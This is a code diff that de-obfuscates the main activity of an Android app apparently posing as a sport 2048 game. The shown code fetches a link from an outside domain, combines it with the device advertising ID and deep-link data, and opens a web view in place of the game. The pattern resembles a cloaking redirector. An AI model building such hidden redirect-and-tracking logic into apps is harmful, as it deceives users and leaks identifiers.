@@ -44,57 +44,57 @@ import com.google.android.gms.ads.identifier.AdvertisingIdClient
 import com.onesignal.OneSignal
 import game.matchtwo.sportbm.ui.theme.Sport2048GameTheme
 import game.matchtwo.sportbm.yespye.BochonkiGame
-import game.matchtwo.sportbm.yespye.codesi.iqjwruhqwruqwuri2
+import game.matchtwo.sportbm.yespye.codesi.WebActivity
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.delay
 import kotlinx.coroutines.launch
 import kotlinx.coroutines.withContext
 import org.jsoup.Jsoup
-const val rwqhriqwirhwqhiwrhi = "f7b0c350-46ef-4fac-a298-0d9a3aacc250"
-class IhujhufUHFWQqowoe : ComponentActivity() {
+const val onseSignalKey = "f7b0c350-46ef-4fac-a298-0d9a3aacc250"
+class MainActivity : ComponentActivity() {
     val link = "https://tigertrail.online/pyS"
     private var combinedLink: String? = null
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
-        val jiqwrihqiwr28r2h8 = WindowCompat.getInsetsController(window,window.decorView)
-        jiqwrihqiwr28r2h8.systemBarsBehavior = WindowInsetsControllerCompat.BEHAVIOR_SHOW_TRANSIENT_BARS_BY_SWIPE
-        jiqwrihqiwr28r2h8.hide(WindowInsetsCompat.Type.systemBars())
+        val controller = WindowCompat.getInsetsController(window,window.decorView)
+        controller.systemBarsBehavior = WindowInsetsControllerCompat.BEHAVIOR_SHOW_TRANSIENT_BARS_BY_SWIPE
+        controller.hide(WindowInsetsCompat.Type.systemBars())
         FacebookSdk.sdkInitialize(applicationContext);
         AppEventsLogger.activateApp(application);
-        OneSignal.initWithContext(this, rwqhriqwirhwqhiwrhi)
+        OneSignal.initWithContext(this, onseSignalKey)
 
-        val ijqfjhuwiqwhruwqr = getSavedCombinedLink()
-        if (ijqfjhuwiqwhruwqr != null) {
-            val qwuirhyqwriu2 = Intent(
-                this@IhujhufUHFWQqowoe,
-                iqjwruhqwruqwuri2::class.java
+        val savedCombinedLink = getSavedCombinedLink()
+        if (savedCombinedLink != null) {
+            val intent = Intent(
+                this@MainActivity,
+                WebActivity::class.java
             )
-            qwuirhyqwriu2.putExtra("LLL_EXTRA", ijqfjhuwiqwhruwqr)
+            intent.putExtra("LLL_EXTRA", savedCombinedLink)
             CoroutineScope(Dispatchers.Default).launch{
                 delay(1000)
-                startActivity(qwuirhyqwriu2)
+                startActivity(intent)
                 finish()
             }
             return
         } else {
             AppLinkData.fetchDeferredAppLinkData(applicationContext) { appLinkData ->
-                val iqjwirqwuhrqwrurq = appLinkData?.targetUri?.host
+                val host = appLinkData?.targetUri?.host
                 CoroutineScope(Dispatchers.IO).launch {
-                    val hqwruhqwurqw7yru = fetchHtmlContent(link)
-                    if (hqwruhqwurqw7yru.isNotEmpty()) {
+                    val response = fetchHtmlContent(link)
+                    if (response.isNotEmpty()) {
                         val uyqgwrgygwqruwq = fetchAdvertisingId()
-                        combinedLink = combineLinks(iqjwirqwuhrqwrurq, uyqgwrgygwqruwq, hqwruhqwurqw7yru)
+                        combinedLink = combineLinks(host, uyqgwrgygwqruwq, response)
                         saveCombinedLink(combinedLink)
 
-                        val hquwrhiuhqwruhqwir2 = Intent(
-                            this@IhujhufUHFWQqowoe,
-                            iqjwruhqwruqwuri2::class.java
+                        val intent = Intent(
+                            this@MainActivity,
+                            WebActivity::class.java
                         )
-                        hquwrhiuhqwruhqwir2.putExtra("LLL_EXTRA", combinedLink)
+                        intent.putExtra("LLL_EXTRA", combinedLink)
                         delay(1000)
                         withContext(Dispatchers.Main){
-                            startActivity(hquwrhiuhqwruhqwir2)
+                            startActivity(intent)
                             finish()
                         }
 
@@ -149,7 +149,7 @@ class IhujhufUHFWQqowoe : ComponentActivity() {
                                 contentDescription = "",
                                 modifier = Modifier.fillMaxSize(),
                                 contentScale = ContentScale.Crop)
-                            this@IhujhufUHFWQqowoe.requestedOrientation = ActivityInfo.SCREEN_ORIENTATION_LANDSCAPE
+                            this@MainActivity.requestedOrientation = ActivityInfo.SCREEN_ORIENTATION_LANDSCAPE
                             BochonkiGame(refresh,currentScore,bestScore,revert,score)
 
 
